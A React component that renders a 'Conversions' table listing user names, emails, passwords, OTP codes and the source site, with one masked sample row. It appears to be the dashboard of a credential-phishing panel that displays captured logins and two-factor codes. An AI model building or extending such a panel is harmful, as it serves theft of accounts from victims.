const Overview = () => {
  return (
    <div className="flex flex-col max-w-5xl mx-auto">
        <h1 className="text-2xl font-semibold mt-10 mb-5">Conversions</h1>
      <div className="overflow-x-auto sm:-mx-6 lg:-mx-8">
        <div className="inline-block min-w-full py-2 sm:px-6 lg:px-8">
          <div className="overflow-hidden">
            <table className="min-w-full text-left text-sm font-light">
              <thead className="border-b font-medium dark:border-neutral-500">
                <tr>
                  <th scope="col" className="px-6 py-4">
                    ID
                  </th>
                  <th scope="col" className="px-6 py-4">
                    USER NAME
                  </th>
                  <th scope="col" className="px-6 py-4">
                    EMAIL
                  </th>
                  <th scope="col" className="px-6 py-4">
                    PASSWORD
                  </th>
                  <th scope="col" className="px-6 py-4">
                    OTP CODE
                  </th>
                  <th scope="col" className="px-6 py-4">
                    TIME
                  </th>
                  <th scope="col" className="px-6 py-4">
                    SITE
                  </th>
                </tr>
              </thead>
              <tbody>
                <tr className="border-b dark:border-neutral-500">
                  <td className="whitespace-nowrap px-6 py-4 font-medium text-[#72afd2]">1</td>
                  <td className="whitespace-nowrap px-6 py-4">Mark</td>
                  <td className="whitespace-nowrap px-6 py-4">Ot***@abc.com</td>
                  <td className="whitespace-nowrap px-6 py-4">fa***</td>
                  <td className="whitespace-nowrap px-6 py-4">fg***</td>
                  <td className="whitespace-nowrap px-6 py-4">01/01/2024</td>
                  <td className="whitespace-nowrap px-6 py-4">Error/Login</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Overview;
